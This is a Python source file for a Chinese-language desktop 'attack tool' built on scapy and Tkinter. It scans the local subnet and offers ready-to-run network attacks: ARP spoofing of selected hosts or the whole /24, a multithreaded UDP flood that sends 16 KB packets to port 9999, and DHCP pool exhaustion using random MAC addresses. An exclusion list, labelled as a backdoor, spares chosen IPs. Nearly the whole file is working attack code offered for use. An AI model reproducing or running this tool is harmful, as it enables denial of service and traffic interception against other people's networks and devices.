import os
import time
import psutil
import socket
import struct
import random
import argparse
import threading
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext
from scapy.all import *
stop = 0
DOSS = 'OFF'
UDP='OFF'
DHCP='OFF'
runarp = 'OFF'
rundoss = 'OFF'
runudp='OFF'
rundhcp='OFF'
List = []
all_ip = []
afterdoorip_list = []
target_ip_list = []
class ARPSpoofingApp:
    def __init__(self, root):
        # 获取点击的IP
        def on_item_click(event):
            global stop, target_ip_list
            if stop == 1:
                self.stop_spoofing()
                stop = 0
            item_id = self.tree.selection()
            item_values = self.tree.item(item_id, "values")
            List.append(item_values[0])
            target_ip_list = list(set(List))
            self.log_area2.configure(state='normal')  # 解除禁用状态
            self.log_area2.delete("1.0", tk.END)  # 执行删除操作
            self.log_area2.configure(state='disabled')  # 恢复禁用状态
            self.log2('当前选择的被攻击IP:')
            for i in range(len(target_ip_list)):
                self.log2(target_ip_list[i])
        self.root = root
        self.root.title("攻击工具")
        self.root.geometry("750x500")
        # 网口选择组件
        self.interface_frame = tk.Frame(root)
        self.interface_frame.pack(fill=tk.X, padx=5, pady=5)

        tk.Label(self.interface_frame, text="选择网卡:").pack(side=tk.LEFT)
        self.interface_var = tk.StringVar()
        self.interface_combo = ttk.Combobox(self.interface_frame,
                                            textvariable=self.interface_var,
                                            state="readonly")
        self.interface_combo.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)

        self.refresh_button = tk.Button(self.interface_frame,
                                        text="刷新网卡",
                                        command=self.refresh_interfaces)
        self.refresh_button.pack(side=tk.LEFT, padx=5)
        # 开始/结束攻击
        self.start_button = tk.Button(
            root, text="开始攻击", command=self.start_spoofing)
        self.start_button.pack()
        self.stop_button = tk.Button(
            root, text="停止攻击", command=self.stop_spoofing, state=tk.DISABLED)
        self.stop_button.pack()
        # 清除ARP攻击列表
        self.qc_button = tk.Button(root, text="清除攻击列表", command=self.cq)
        self.qc_button.place(x=640, y=40)
        # 扫描局域网
        self.scan_button = tk.Button(
            root, text="扫描局域网", command=self.scan_network)
        self.scan_button.place(x=105, y=70)
        self.qx_button = tk.Button(root, text="全选", command=self.qxip)
        self.qx_button.place(x=0, y=70)
        # 帮助
        self.button = tk.Button(root, text="帮助?", command=self.help)
        self.button.place(x=700, y=70)
        # 后门
        self.afterdoor_button = tk.Button(
            root, text="后门", command=self.afterdoor)
        self.afterdoor_button.place(x=0, y=40)
        # DOSS
        self.scan_button = tk.Button(
            root, text="DOSS-OFF",  command=self.doss)
        self.scan_button.place(x=35, y=70)
        #UDP
        self.scan_button_UDP = tk.Button(
            root, text="DOSS-UDP-OFF",  command=self.udp)
        self.scan_button_UDP.place(x=35, y=40)
        #DHCP
        self.DHCP = tk.Button(
            root, text="DHCP-OFF",  command=self.DHCP_open)
        self.DHCP.place(x=135, y=40)
        # 打印扫描到的名单
        self.tree = ttk.Treeview(root, columns=("IP", "MAC"), show="headings")
        self.tree.heading("IP", text="IP名单")
        self.tree.heading("MAC", text="MAC名单")
        self.tree.pack(fill=tk.BOTH, expand=True)
        # 输出框
        self.log_label = tk.Label(root, text="输出:")
        self.log_label.pack()
        self.log_area = scrolledtext.ScrolledText(
            root, wrap="word", width=70, height=10)
        self.log_area.pack(side="left", fill="both",
                           expand=True, padx=5, pady=5)
        self.log_label2 = tk.Label(root, text="被攻击IP:")
        self.log_label2.pack()
        self.log_area2 = scrolledtext.ScrolledText(
            root, wrap="word", width=15, height=10)
        self.log_area2.pack(side="right", fill="both",
                            expand=True, padx=5, pady=5)
        # 初始化网卡列表
        self.refresh_interfaces()
        # 清除log
        self.qcl_button = tk.Button(root, text="清除输出", command=self.qclog)
        self.qcl_button.place(x=640, y=70)
        # Status variables
        self.spoofing = False
        # 捕获鼠标点击
        self.tree.bind("<ButtonRelease-1>", on_item_click)

    def refresh_interfaces(self):
        global myiplist,interfaces,alllist,iface,gateway_ip,ifaceip
        interfaces = []
        alllist=[]
        for name, addrs in psutil.net_if_addrs().items():
            if any(addr.family == socket.AF_INET for addr in addrs):
                interfaces.append(name)
        alllist={name: [addr.address for addr in addrs if addr.family == 2]  for name, addrs in psutil.net_if_addrs().items()}
        self.interface_combo['values'] = interfaces
        iface=interfaces[1]
        self.log('默认网口为：'+iface)
        myip=alllist[iface]
        gateway_ip=str(myip[:2])
        gateway_ip=gateway_ip[2:]
        ifaceip=gateway_ip[:-2]
        subnet = (".".join(gateway_ip.split(".")[:-1])) +'.0/24'
        gateway_ip=(".".join(gateway_ip.split(".")[:-1]))+'.1'
        self.log('默认网关为：' +gateway_ip)
    def get_selected_interface(self):
        global myiplist,interfaces,alllist,iface,gateway_ip,ifaceip
        if self.interface_var.get() == '':
            a=iface
        else:
            a=self.interface_var.get()
        self.log('当前网口为：' + a)
        myip=alllist[a]
        gateway_ip=str(myip[:2])
        gateway_ip=gateway_ip[2:]
        ifaceip=gateway_ip[:-2]
        subnet = (".".join(gateway_ip.split(".")[:-1])) +'.0/24'
        gateway_ip=(".".join(gateway_ip.split(".")[:-1]))+'.1'
        self.log('当前网关为：' +gateway_ip)
        return a
    def afterdoor_del(self):
        global afterdoorip_list, target_ip_list
        target_ip_list = all_ip
        afterdoorip_list = []
        self.log_area3.configure(state='normal')  # 解除禁用状态
        self.log_area3.delete("1.0", tk.END)  # 执行删除操作
        self.log_area3.configure(state='disabled')  # 恢复禁用状态

    def afterdoor(self):
        global afterdoorip_list

        def on_item_clicka(event):
            global stop, afterdoorip_list
            if stop == 1:
                self.stop_spoofing()
                stop = 0
            item_id = self.treea.selection()
            item_values = self.treea.item(item_id, "values")
            afterdoorip_list.append(item_values[0])
            afterdoorip_list = list(set(afterdoorip_list))
            self.log_area3.configure(state='normal')  # 解除禁用状态
            self.log_area3.delete("1.0", tk.END)  # 执行删除操作
            self.log_area3.configure(state='disabled')  # 恢复禁用状态
            for i in range(len(afterdoorip_list)):
                self.log3(afterdoorip_list[i])
        roota = tk.Tk()
        self.roota = roota
        self.roota.title("ARP攻击工具-后门")
        self.roota.geometry("500x400")
        self.qca_button = tk.Button(
            roota, text="清除后门IP列表", command=self.afterdoor_del)
        self.qca_button.pack()
        self.treea = ttk.Treeview(roota, columns=("IP"), show="headings")
        self.treea.heading("IP", text="IP名单")
        self.treea.pack(fill=tk.BOTH, expand=True)
        self.log_label3 = tk.Label(roota, text="后门中的IP:")
        self.log_label3.pack()
        self.log_area3 = scrolledtext.ScrolledText(
            roota, wrap="word", width=15, height=10)
        self.log_area3.pack(fill="both", expand=True, padx=5, pady=5)
        for i in range(len(afterdoorip_list)):
            self.log3(afterdoorip_list[i])
        if DOSS == 'ON':
            for j in range(256):
                v = gateway_ip[:-1] + str(j)
                self.treea.insert("", tk.END, values=(v,))
        else:
            for ip in all_ip:
                self.treea.insert("", tk.END, values=(ip,))
        self.treea.bind("<ButtonRelease-1>", on_item_clicka)
        roota.mainloop()

    def qxip(self):
        global target_ip_list
        if all_ip == []:
            self.log("错误:请扫描局域网")
            messagebox.showerror("错误:", "请扫描局域网")
            return
        target_ip_list = all_ip
        self.log_area2.configure(state='normal')  # 解除禁用状态
        self.log_area2.delete("1.0", tk.END)  # 执行删除操作
        self.log_area2.configure(state='disabled')  # 恢复禁用状态
        self.log2('当前选择的被攻击IP:')
        for i in range(len(target_ip_list)):
            self.log2(target_ip_list[i])

    def qclog(self):
        self.log_area.configure(state='normal')  # 解除禁用状态
        self.log_area.delete("1.0", tk.END)  # 执行删除操作
        self.log_area.configure(state='disabled')  # 恢复禁用状态

    def qclog3(self):
        self.log_area3.configure(state='normal')  # 解除禁用状态
        self.log_area3.delete("1.0", tk.END)  # 执行删除操作
        self.log_area3.configure(state='disabled')  # 恢复禁用状态
    # 定义清除ARP攻击列表函数

    def cq(self):
        global target_ip_list, List, stop
        target_ip_list = []
        List = []
        if stop == 1:
            self.stop_spoofing()
            stop = 0
        self.log_area2.configure(state='normal')  # 解除禁用状态
        self.log_area2.delete("1.0", tk.END)  # 执行删除操作
        self.log_area2.configure(state='disabled')  # 恢复禁用状态
        self.log2('已清除ARP攻击列表')

    def help(self):
        self.log('帮助:点击"扫描局域网"可以扫描局域网的主机')
        self.log('   Linux环境无法获取网关IP,请手动输入后再次扫描局域网')
        self.log('   点击"清除ARP攻击列表"可以清除保存的被攻击IP')
        self.log('   点击"清除输出"可以清除输出框中的内容')
        self.log('   点击"结束ARP"攻击可以结束ARP攻击')
        self.log('   点击"开始ARP"攻击可以自动进行ARP攻击')
        self.log('   点击"全选"可以自动选中所有IP')
        self.log('   默认发送ARP数据包间隔100毫秒')

    def start_spoofing(self):
        if target_ip_list == [] and DOSS == 'OFF' and UDP=='OFF' and DHCP=='OFF':
            self.log("错误:请点击 IP名单 中的某行或全选")
            messagebox.showerror("错误:", "请点击 IP名单 中的某行或全选")
            return
        self.spoofing = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.spoof_thread = threading.Thread(target=self.spoof)
        self.spoof_thread.daemon = True
        self.spoof_thread.start()
        if DOSS == 'OFF' and UDP=='OFF' and DHCP=='OFF':
            self.log(f"开始ARP攻击:被攻击IP = {target_ip_list}, 网关IP = {gateway_ip}")

    def stop_spoofing(self):
        global stop, DOSS, runarp, rundoss,rundhcp
        rundoss = 'OFF'
        runarp = 'OFF'
        rundhcp='OFF'
        self.spoofing = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.log("停止ARP攻击")
        stop = 0



    def doss(self):
        global DOSS,UDP,DHCP
        if self.scan_button["text"] == "DOSS-ON":
            self.scan_button.config(text="DOSS-OFF")
            DOSS = "OFF"
        else:
            self.scan_button.config(text="DOSS-ON")
            DOSS = "ON"
        if self.scan_button_UDP["text"] == "DOSS-UDP-ON":
            self.scan_button_UDP.config(text="DOSS-UDP-OFF")
            UDP = "OFF"
        if self.DHCP["text"] == "DHCP-ON":
            self.DHCP.config(text="DHCP-OFF")
            DHCP = "OFF"
    def doss_s(self, vip):
        global rundoss
        s = 0
        for j in afterdoorip_list:
            if vip == j:
                s = 1
        while self.spoofing and s == 0 and runarp == 'OFF' and runudp=='OFF':
            rundoss = 'ON'
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                  ARP(pdst=vip, psrc=gateway_ip), verbose=0,iface=iface)
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                  ARP(pdst=gateway_ip, psrc=vip), verbose=0,iface=iface)
            time.sleep(0.3)
        return
    def udp(self):
        global UDP,DOSS,DHCP
        if self.scan_button_UDP["text"] == "UDP-ON":
            self.scan_button_UDP.config(text="UDP-OFF")
            UDP= "OFF"
        else:
            self.scan_button_UDP.config(text="DOSS-UDP-ON")
            UDP= "ON"
        if self.scan_button["text"] == "DOSS-ON":
            self.scan_button.config(text="DOSS-OFF")
            DOSS = "OFF"
        if self.DHCP["text"] == "DHCP-ON":
            self.DHCP.config(text="DHCP-OFF")
            DHCP = "OFF"

    def socket_sender_udp(self, TARGET_IP):
        global runudp
        PAYLOAD = b"X" * 16384
        sock = None

        try:
            # 检查目标IP是否在保护列表中
            if any(TARGET_IP == j for j in afterdoorip_list):
                return

            # 创建非阻塞式UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            sock.setblocking(True)  # 非阻塞模式

            # 绑定到指定网卡
            sock.bind((ifaceip, 0))

            while self.spoofing and runarp == 'OFF' and rundoss == 'OFF':
                runudp = 'ON'
                try:
                    sock.sendto(PAYLOAD, (TARGET_IP, 9999))
                    time.sleep(0.001)  # 控制发送频率
                except socket.error:
                    continue  # 非阻塞模式下忽略临时错误
            return

        except Exception as e:
            self.log(f"UDP发送错误: {str(e)}")
        finally:
            runudp = 'OFF'
            if sock:
                sock.close()

    def arpsp(self, i):
        global stop, runarp
        if self.spoofing:
            stop = 1
        else:
            stop = 0
        target_ip = target_ip_list[i]
        self.log(f"开始发送ARP数据包:被攻击IP = {target_ip},网关IP = {gateway_ip},线程号{i}")
        while self.spoofing and rundoss == 'OFF' and runudp=='OFF':
            runarp = 'ON'
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                  ARP(pdst=target_ip, psrc=gateway_ip), verbose=0,iface=iface)
            # 发送arp数据包给被攻击IP
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                  ARP(pdst=gateway_ip, psrc=target_ip), verbose=0,iface=iface)
            time.sleep(0.1)
        return
    def spoof(self):
        global stop, DOSS, target_ip_list
        if DOSS == 'ON':
            self.log(f"开始ARP攻击:被攻击IP = {gateway_ip[:-1] +'0'}-{gateway_ip[:-1] +'255'}, 网关IP = {gateway_ip}")
            self.log_area2.configure(state='normal')  # 解除禁用状态
            self.log_area2.delete("1.0", tk.END)  # 执行删除操作
            self.log_area2.configure(state='disabled')  # 恢复禁用状态
            self.log2('当前选择的被攻击IP:')
            target_ip_list = list(set(target_ip_list))
            self.get_selected_interface()
            for d in range(256):
                vip = gateway_ip[:-1] + str(d)
                s = 0
                for j in afterdoorip_list:
                    if vip == j:
                        s = 1
                if self.spoofing and s == 0:
                    self.log2(vip)
                    self.log(
                        f"开始发送ARP数据包:被攻击IP = {vip},网关IP = {gateway_ip},线程号{d}")
                    thread = threading.Thread(target=self.doss_s, args=(vip,))
                    thread.start()
                time.sleep(0.01)
        elif UDP=='ON':
            self.log(
                f"开始UDP攻击:被攻击IP = {gateway_ip[:-1] +'0'}-{gateway_ip[:-1] +'255'}")
            self.log_area2.configure(state='normal')  # 解除禁用状态
            self.log_area2.delete("1.0", tk.END)  # 执行删除操作
            self.log_area2.configure(state='disabled')  # 恢复禁用状态
            self.log2('当前选择的被攻击IP:')
            target_ip_list = list(set(target_ip_list))
            self.get_selected_interface()
            for d in range(192):
                vip = gateway_ip[:-1] + str(d)
                s = 0
                for j in afterdoorip_list:
                    if vip == j:
                        s = 1
                if self.spoofing and s == 0:
                    self.log2(vip)
                    self.log(
                        f"开始发送UDP数据包:被攻击IP = {vip},线程号{d}")
                    thread = threading.Thread(target=self.socket_sender_udp, args=(vip,))
                    thread.start()
                time.sleep(0.01)
        elif DHCP=='ON':
            self.log('开始挤占ip地址')
            thread = threading.Thread(target=self.DHCP_run, args=())
            thread.start()
        else:
            a = 0
            target_ip_list = [
                x for x in target_ip_list if x not in afterdoorip_list]
            for i in range(len(target_ip_list)):
                thread = threading.Thread(target=self.arpsp, args=(i,))
                thread.start()
                # 每隔0.05秒启动一个线程
                time.sleep(0.05)

    def scan_network(self):
        global iface, myip, gateway_ip
        # 清除treeview
        for row in self.tree.get_children():
            self.tree.delete(row)

        iface=self.get_selected_interface()
        myip=alllist[iface]
        local_ip = self.get_local_ip()
        if not local_ip:
            self.log("错误:没有找到IP")
            messagebox.showerror("错误:", "没有找到IP")
            return
        gateway_ip=str(myip[:2])
        gateway_ip=gateway_ip[2:]
        subnet = (".".join(gateway_ip.split(".")[:-1])) +'.0/24'
        gateway_ip=(".".join(gateway_ip.split(".")[:-1]))+'.1'
        self.log(f"扫描的接口: {subnet}")

        def gatewayError():
            global gateway_ip

            def dy():
                global gateway_ip
                gateway_ip = entry.get()
                window.destroy()
            self.log("错误:没有找到网关IP")
            messagebox.showerror("错误:", "没有找到网关IP,请手动输入:")
            window = tk.Tk()
            window.geometry("100x80")
            label = tk.Label(window, text="输入:")
            label.pack()
            entry = tk.Entry(window, width=20)
            entry.pack()
            button = tk.Button(window, text="确定", command=dy)
            button.pack()
            window.mainloop()
        try:
            self.log(gateway_ip)
        except NameError:
            gatewayError()
        # 创建扫描线程
        self.scan_button.config(state=tk.DISABLED)
        self.scan_thread = threading.Thread(
            target=self.perform_arp_scan, args=(subnet,))
        self.scan_thread.daemon = True
        self.scan_thread.start()

    def perform_arp_scan(self, subnet):
        global all_ip, maclista
        all_ip = []
        maclista = []
        # 开始ARP扫描
        self.log("开始ARP扫描...")
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /ARP(pdst=subnet, psrc=gateway_ip), timeout=2, verbose=False,iface=iface)
        # 打印找到的主机在treeview中
        for _, rcv in ans:
            ip = rcv[ARP].psrc
            all_ip.append(ip)
            mac = rcv[Ether].src
            maclista.append(mac)
            self.tree.insert("", tk.END, values=(ip, mac))
            self.log(f"找到的主机: IP = {ip}, MAC = {mac}")
        self.log("ARP扫描结束.")
        self.scan_button.config(state=tk.NORMAL)

    def get_local_ip(self):
        try:
            # Create a socket to get the local IP address
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception as e:
            self.log(f"Error getting local IP: {e}")
            return None

    def log(self, message):
        # Enable the text area, insert the message, and disable it again
        self.log_area.config(state='normal')
        self.log_area.insert(tk.END, message + "\n")
        self.log_area.config(state='disabled')
        # Auto-scroll to the bottom
        self.log_area.yview(tk.END)

    def log2(self, message):
        # Enable the text area, insert the message, and disable it again
        self.log_area2.config(state='normal')
        self.log_area2.insert(tk.END, message + "\n")
        self.log_area2.config(state='disabled')
        # Auto-scroll to the bottom
        self.log_area2.yview(tk.END)

    def log3(self, message):
        # Enable the text area, insert the message, and disable it again
        self.log_area3.config(state='normal')
        self.log_area3.insert(tk.END, message + "\n")
        self.log_area3.config(state='disabled')
        # Auto-scroll to the bottom
        self.log_area3.yview(tk.END)

    class DHCPClient:
        def __init__(self,arp_spoofing_app, gateway_ip=None):
            self.arp_spoofing_app = arp_spoofing_app
            self.sock = None
            self.interface = None
            self.mac_address = self.generate_random_mac()
            self.transaction_id = random.randint(1, 0xffffffff)
            self.assigned_ip = None
            self.server_ip = None
            self.lease_time = 0
            self.subnet_mask = None
            self.gateway = gateway_ip  # 使用传入的网关IP
            self.dns_servers = []
            self.broadcast_addr = "255.255.255.255"

        def generate_random_mac(self):
            """生成随机MAC地址"""
            mac = [0x00, 0x16, 0x3e,
                   random.randint(0x00, 0x7f),
                   random.randint(0x00, 0xff),
                   random.randint(0x00, 0xff)]
            return bytes(mac)

        def create_socket(self):
            """创建UDP socket"""
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            self.sock.bind(('', 68))  # DHCP客户端端口

        def build_dhcp_discover(self):
            """构建DHCP Discover消息"""
            packet = bytearray(240)
            packet[0] = 1  # 消息类型：请求
            packet[1] = 1  # 硬件类型：以太网
            packet[2] = 6  # 硬件地址长度
            packet[3] = 0  # 跳数
            packet[4:8] = struct.pack('>I', self.transaction_id)  # 事务ID
            packet[8:10] = b'\x00\x00'  # 秒数
            packet[10:12] = b'\x80\x00'  # 广播标志
            packet[28:34] = self.mac_address  # 客户端MAC地址
            packet[236:240] = b'\x63\x82\x53\x63'  # Magic Cookie

            # DHCP消息类型选项
            options = bytearray()
            options.append(53)  # DHCP消息类型选项
            options.append(1)  # 长度
            options.append(1)  # DHCP Discover
            options.append(55)  # 参数请求列表
            options.append(4)  # 长度
            options.append(1)  # 子网掩码
            options.append(3)  # 路由器
            options.append(6)  # DNS服务器
            options.append(15)  # 域名
            options.append(255)  # 结束选项

            # 填充到最小长度
            padding_length = max(0, 300 - len(packet) - len(options))
            padding = bytearray(padding_length)

            return bytes(packet + options + padding)

        def build_dhcp_request(self, offered_ip, server_ip):
            """构建DHCP Request消息"""
            packet = bytearray(240)
            packet[0] = 1  # 消息类型：请求
            packet[1] = 1  # 硬件类型：以太网
            packet[2] = 6  # 硬件地址长度
            packet[3] = 0  # 跳数
            packet[4:8] = struct.pack('>I', self.transaction_id)  # 事务ID
            packet[8:10] = b'\x00\x00'  # 秒数
            packet[10:12] = b'\x80\x00'  # 广播标志
            packet[12:16] = socket.inet_aton(offered_ip)  # 请求的IP地址
            packet[28:34] = self.mac_address  # 客户端MAC地址
            packet[236:240] = b'\x63\x82\x53\x63'  # Magic Cookie

            # DHCP消息类型选项
            options = bytearray()
            options.append(53)  # DHCP消息类型选项
            options.append(1)  # 长度
            options.append(3)  # DHCP Request
            options.append(50)  # 请求的IP地址选项
            options.append(4)  # 长度
            options.extend(socket.inet_aton(offered_ip))  # 请求的IP地址
            options.append(54)  # DHCP服务器标识符选项
            options.append(4)  # 长度
            options.extend(socket.inet_aton(server_ip))  # 服务器IP地址
            options.append(55)  # 参数请求列表
            options.append(4)  # 长度
            options.append(1)  # 子网掩码
            options.append(3)  # 路由器
            options.append(6)  # DNS服务器
            options.append(15)  # 域名
            options.append(255)  # 结束选项

            # 填充到最小长度
            padding_length = max(0, 300 - len(packet) - len(options))
            padding = bytearray(padding_length)

            return bytes(packet + options + padding)

        def parse_dhcp_offer(self, data):
            """解析DHCP Offer消息"""
            if len(data) < 240:
                return None, None, 0, "255.255.255.0", None, []

            offered_ip = socket.inet_ntoa(data[16:20])
            server_ip = None
            lease_time = 86400
            subnet_mask = "255.255.255.0"
            gateway = self.gateway  # 使用初始化时设置的网关
            dns_servers = []

            # 解析选项
            i = 240
            while i < len(data) and data[i] != 255:
                if i + 1 >= len(data):
                    break
                option_type = data[i]
                option_length = data[i + 1]

                if i + 2 + option_length > len(data):
                    break

                if option_type == 54:  # DHCP服务器标识符
                    server_ip = socket.inet_ntoa(data[i + 2:i + 6])
                elif option_type == 51:  # IP地址租期
                    lease_time = struct.unpack('>I', data[i + 2:i + 6])[0]
                elif option_type == 1:  # 子网掩码
                    subnet_mask = socket.inet_ntoa(data[i + 2:i + 6])
                elif option_type == 3:  # 路由器
                    gateway = socket.inet_ntoa(data[i + 2:i + 6])
                elif option_type == 6:  # DNS服务器
                    for j in range(0, option_length, 4):
                        if i + 2 + j + 4 <= len(data):
                            dns_servers.append(socket.inet_ntoa(data[i + 2 + j:i + 2 + j + 4]))

                i += 2 + option_length

            return offered_ip, server_ip, lease_time, subnet_mask, gateway, dns_servers

        def send_dhcp_discover(self):
            """发送DHCP Discover消息"""
            try:
                discover_packet = self.build_dhcp_discover()
                # 如果指定了网关IP，则向该网关发送，否则广播
                target_addr = (self.gateway, 67) if self.gateway else (self.broadcast_addr, 67)
                self.sock.sendto(discover_packet, target_addr)
                self.arp_spoofing_app.log(f"已发送DHCP Discover到 {target_addr[0]}")
            except Exception as e:
                self.arp_spoofing_app.log(f"发送DHCP Discover时出错: {e}")

        def receive_dhcp_offer(self):
            """接收DHCP Offer消息"""
            try:
                self.sock.settimeout(5)
                data, addr = self.sock.recvfrom(1024)
                self.arp_spoofing_app.log(f"已接收到来自 {addr[0]} 的DHCP Offer")
                return data
            except socket.timeout:
                self.arp_spoofing_app.log("等待DHCP Offer超时")
                return None
            except Exception as e:
                self.arp_spoofing_app.log(f"接收DHCP Offer时出错: {e}")
                return None

        def send_dhcp_request(self, offered_ip, server_ip):
            """发送DHCP Request消息"""
            try:
                request_packet = self.build_dhcp_request(offered_ip, server_ip)
                # 如果指定了网关IP，则向该网关发送，否则广播
                target_addr = (self.gateway, 67) if self.gateway else (self.broadcast_addr, 67)
                self.sock.sendto(request_packet, target_addr)
                self.arp_spoofing_app.log(f"已发送DHCP Request到 {target_addr[0]}")
            except Exception as e:
                self.arp_spoofing_app.log(f"发送DHCP Request时出错: {e}")

        def receive_dhcp_ack(self):
            """接收DHCP ACK消息"""
            try:
                self.sock.settimeout(5)
                data, addr = self.sock.recvfrom(1024)
                self.arp_spoofing_app.log(f"已接收到来自 {addr[0]} 的DHCP ACK")
                return data
            except socket.timeout:
                self.arp_spoofing_app.log("等待DHCP ACK超时")
                return None
            except Exception as e:
                self.arp_spoofing_app.log(f"接收DHCP ACK时出错: {e}")
                return None
        def release_ip(self):
            """释放IP地址"""
            if self.assigned_ip and self.server_ip:
                self.arp_spoofing_app.log(f"[DHCP] 释放IP地址 {self.assigned_ip}")
                # 这里可以实现DHCP Release消息的发送
                self.assigned_ip = None
                self.server_ip = None
        def run(self):
            """运行DHCP客户端"""
            try:
                self.create_socket()

                # 发送DHCP Discover
                self.send_dhcp_discover()

                # 接收DHCP Offer
                offer_data = self.receive_dhcp_offer()
                if not offer_data:
                    self.arp_spoofing_app.log("未能接收到DHCP Offer")
                    return False

                # 解析DHCP Offer
                offered_ip, server_ip, lease_time, subnet_mask, gateway, dns_servers = self.parse_dhcp_offer(offer_data)
                if not offered_ip or not server_ip:
                    self.arp_spoofing_app.log("解析DHCP Offer失败")
                    return False

                self.arp_spoofing_app.log(f"提供的IP地址: {offered_ip}")
                self.arp_spoofing_app.log2(f"获取IP: {offered_ip}")
                self.arp_spoofing_app.log(f"服务器IP: {server_ip}")
                self.arp_spoofing_app.log(f"租期: {lease_time}")
                self.arp_spoofing_app.log(f"子网掩码: {subnet_mask}")
                self.arp_spoofing_app.log(f"网关: {gateway}")
                self.arp_spoofing_app.log(f"DNS服务器: {dns_servers}")

                # 发送DHCP Request
                self.send_dhcp_request(offered_ip, server_ip)

                # 接收DHCP ACK
                ack_data = self.receive_dhcp_ack()
                if not ack_data:
                    self.arp_spoofing_app.log("未能接收到DHCP ACK")
                    return False

                # 解析DHCP ACK
                ack_ip, ack_server, ack_lease, ack_mask, ack_gateway, ack_dns = self.parse_dhcp_offer(ack_data)
                if not ack_ip or not ack_server:
                    self.arp_spoofing_app.log("解析DHCP ACK失败")
                    return False

                # 保存配置
                self.assigned_ip = ack_ip
                self.server_ip = ack_server
                self.lease_time = ack_lease
                self.subnet_mask = ack_mask
                self.gateway = ack_gateway
                self.dns_servers = ack_dns

                self.arp_spoofing_app.log("DHCP配置成功!")
                self.arp_spoofing_app.log(f"分配的IP地址: {self.assigned_ip}")
                self.arp_spoofing_app.log(f"网关: {self.gateway}")
                self.arp_spoofing_app.log(f"DNS服务器: {self.dns_servers}")

                return True

            except Exception as e:
                self.arp_spoofing_app.log(f"DHCP客户端错误: {e}")
                return False
            finally:
                if self.sock:
                    self.sock.close()
    def DHCP_open(self):
        global DHCP,UDP,DDOS
        if self.DHCP["text"] == "DHCP-ON":
            self.DHCP.config(text="DHCP-OFF")
            DHCP = "OFF"
        else:
            self.DHCP.config(text="DHCP-ON")
            DHCP = "ON"
        if self.scan_button_UDP["text"] == "DOSS-UDP-ON":
            self.scan_button_UDP.config(text="DOSS-UDP-OFF")
            UDP = "OFF"
        if self.scan_button["text"] == "DOSS-ON":
            self.scan_button.config(text="DOSS-OFF")
            DDOS = "OFF"
    def DHCP_run(self):
        for i in range(256):
            if self.spoofing:
                self.get_selected_interface()
                client = self.DHCPClient(self, gateway_ip)
                # 创建DHCP客户端
                self.log("使用随机MAC地址")
                thread = threading.Thread(target=self.DHCP_main, args=(client,))
                thread.start()
                time.sleep(1.2)

    def DHCP_main(self,client):
        """主函数"""
        # 运行DHCP客户端
        success = client.run()
        if success:
            self.log("\n获取的网络配置:")
            self.log(f"  IP地址: {client.assigned_ip}")
            self.log(f"  子网掩码: {client.subnet_mask}")
            self.log(f"  网关: {client.gateway or '无'}")

if __name__ == "__main__":
    root = tk.Tk()
    app = ARPSpoofingApp(root)
    root.mainloop()